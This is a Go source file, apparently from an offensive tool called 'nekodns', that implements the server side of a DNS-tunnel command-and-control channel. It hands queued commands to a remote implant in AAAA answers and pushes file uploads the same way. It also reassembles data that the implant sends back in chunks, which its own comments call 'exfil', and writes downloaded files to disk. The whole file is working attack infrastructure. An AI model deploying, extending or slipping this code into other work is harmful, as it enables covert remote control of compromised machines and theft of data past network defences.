package nekodns

import (
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"

	"github.com/fatih/color"
)

// Handler manages DNS query responses
type Handler struct {
	Responses     *DNSResponse
	ActiveCmd     *ActiveCommand
	ResponseQueue chan string
}

// NewHandler creates a new DNS handler
func NewHandler() *Handler {
	return &Handler{
		Responses:     &DNSResponse{Chunks: make([]string, 0)},
		ActiveCmd:     &ActiveCommand{},
		ResponseQueue: make(chan string, 100),
	}
}

// sanitizeDNSDownloadPath confines DNS-tunnel downloads to the current
// working tree: absolute paths and ".." escapes are refused.
func sanitizeDNSDownloadPath(p string) string {
	p = strings.TrimSpace(p)
	// Remote paths use Unix semantics on every host OS: a leading slash
	// is absolute even where filepath.IsAbs disagrees (Windows).
	if p == "" || strings.HasPrefix(p, "/") || filepath.IsAbs(p) {
		return ""
	}
	clean := filepath.Clean(p)
	if clean == "." || clean == ".." || strings.HasPrefix(clean, ".."+string(filepath.Separator)) {
		return ""
	}
	return filepath.ToSlash(clean)
}

// HandleAQuery handles 'a' type DNS queries (command polling)
func (h *Handler) HandleAQuery(hexdata string) []byte {
	h.ActiveCmd.Lock()
	defer h.ActiveCmd.Unlock()

	if h.ActiveCmd.Cmd != "" && !h.ActiveCmd.Delivered {
		h.ActiveCmd.Chunks = SplitCommand(h.ActiveCmd.Cmd, 16)
		h.ActiveCmd.Delivered = true
	}

	if len(h.ActiveCmd.Chunks) > 0 {
		chunk := h.ActiveCmd.Chunks[0]
		h.ActiveCmd.Chunks = h.ActiveCmd.Chunks[1:]
		return PackChunk(chunk)
	} else if h.ActiveCmd.UploadInProgress && len(h.ActiveCmd.FileChunksToSend) > 0 {
		chunk := h.ActiveCmd.FileChunksToSend[0]
		h.ActiveCmd.FileChunksToSend = h.ActiveCmd.FileChunksToSend[1:]
		reversed := ReverseString(chunk)
		return PackChunk(reversed)
	} else {
		if len(h.ActiveCmd.Chunks) == 0 && !h.ActiveCmd.UploadInProgress {
			h.ActiveCmd.Cmd = ""
			h.ActiveCmd.Delivered = false
		}
		rdata := make([]byte, 16)
		rdata[15] = 0x01
		return rdata
	}
}

// HandleSQuery handles 's' type DNS queries (start transmission)
func (h *Handler) HandleSQuery() []byte {
	h.Responses.Lock()
	h.Responses.Chunks = make([]string, 0)
	h.Responses.Unlock()
	return RandomResponse()
}

// maxDNSChunks caps accumulated exfil chunks (100 x ~63B labels) so a
// flooding client cannot grow server memory without bound.
const maxDNSChunks = 100

// HandleDQuery handles 'd' type DNS queries (data chunks)
func (h *Handler) HandleDQuery(hexdata string) []byte {
	if len(hexdata) > 128 {
		return RandomResponse()
	}
	h.Responses.Lock()
	if len(h.Responses.Chunks) < maxDNSChunks {
		reversed := ReverseString(hexdata)
		h.Responses.Chunks = append(h.Responses.Chunks, reversed)
	}
	h.Responses.Unlock()
	return RandomResponse()
}

// HandleEQuery handles 'e' type DNS queries (end transmission)
func (h *Handler) HandleEQuery() []byte {
	h.Responses.Lock()
	fullhex := strings.Join(h.Responses.Chunks, "")
	h.Responses.Chunks = make([]string, 0)
	h.Responses.Unlock()

	data, err := hex.DecodeString(fullhex)
	if err == nil {
		text := string(data)

		h.ActiveCmd.Lock()
		cmd := h.ActiveCmd.Cmd
		h.ActiveCmd.Unlock()

		if strings.HasPrefix(cmd, "download") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) == 2 {
				paths := strings.Split(parts[1], "!")
				if len(paths) == 2 {
					localPath := sanitizeDNSDownloadPath(paths[1])
					if localPath == "" {
						color.Red("[!] Refusing download with escaping path\n")
						h.ResponseQueue <- ""
						h.ActiveCmd.Lock()
						h.ActiveCmd.Cmd = ""
						h.ActiveCmd.Delivered = false
						h.ActiveCmd.Unlock()
						return RandomResponse()
					}
					dir := filepath.Dir(localPath)
					os.MkdirAll(dir, 0o750)
					if err := os.WriteFile(localPath, data, 0o600); err == nil {
						color.Green("[+] File downloaded successfully to %s\n", localPath)
						h.ResponseQueue <- ""
						h.ActiveCmd.Lock()
						h.ActiveCmd.Cmd = ""
						h.ActiveCmd.Delivered = false
						h.ActiveCmd.Unlock()
					}
				}
			}
		} else {
			h.ResponseQueue <- text
		}
	}

	return RandomResponse()
}

// BuildResponse builds a DNS response
func (h *Handler) BuildResponse(request []byte, domain string) []byte {
	if len(request) < 12 {
		return nil
	}
	// DNS Header
	tid := request[:2]
	flags := []byte{0x81, 0x80}
	counts := []byte{0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00}
	header := append(tid, append(flags, counts...)...)

	// Find question end
	i := 12
	for i < len(request) && request[i] != 0 {
		i++
	}
	questionEnd := i + 5
	var question []byte
	if questionEnd <= len(request) {
		question = request[12:questionEnd]
	} else {
		question = request[12:]
	}

	// Process domain
	parts := strings.Split(domain, ".")
	var rdata []byte

	if len(parts) == 0 {
		rdata = make([]byte, 16)
		rdata[15] = 0x01
	} else {
		prefix := parts[0]
		hexdata := ""
		if len(parts) > 1 {
			hexdata = parts[1]
		}

		switch prefix {
		case "a":
			rdata = h.HandleAQuery(hexdata)
		case "s":
			rdata = h.HandleSQuery()
		case "d":
			rdata = h.HandleDQuery(hexdata)
		case "e":
			rdata = h.HandleEQuery()
		default:
			rdata = make([]byte, 16)
			rdata[15] = 0x01
		}
	}

	// Build answer
	answer := []byte{0xc0, 0x0c, 0x00, 0x1c, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x10}
	answer = append(answer, rdata...)

	return append(header, append(question, answer...)...)
}
